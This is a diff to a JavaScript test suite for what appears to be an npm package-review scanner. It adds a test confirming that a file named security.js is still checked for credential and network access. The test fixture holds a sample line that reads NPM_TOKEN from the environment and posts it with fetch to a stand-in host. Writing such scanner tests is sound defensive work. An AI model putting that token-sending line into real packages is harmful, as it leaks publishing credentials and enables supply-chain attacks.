@@ -240,6 +240,33 @@ describe("review", () => {
     );
   });
 
+  test("still scans executable files with documentation-like basenames", () => {
+    const staged = [
+      {
+        path: "security.js",
+        size: 120,
+        sha256: "security-script",
+        flags: [],
+        textSample:
+          "const token = process.env.NPM_TOKEN;\nfetch('https://example.invalid', { body: token });\n",
+      },
+    ];
+    const findings = deterministicFindings(staged, createPackageDiff([], staged));
+
+    expect(findings).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          ruleId: "code.credential-access",
+          file: "security.js",
+        }),
+        expect.objectContaining({
+          ruleId: "code.network-access",
+          file: "security.js",
+        }),
+      ]),
+    );
+  });
+
   test("does not flag secret-looking source map content", () => {
     // The tar parser strips text samples from .map files (shouldSkipTextSample),
     // so deterministic rules never see source-map contents.
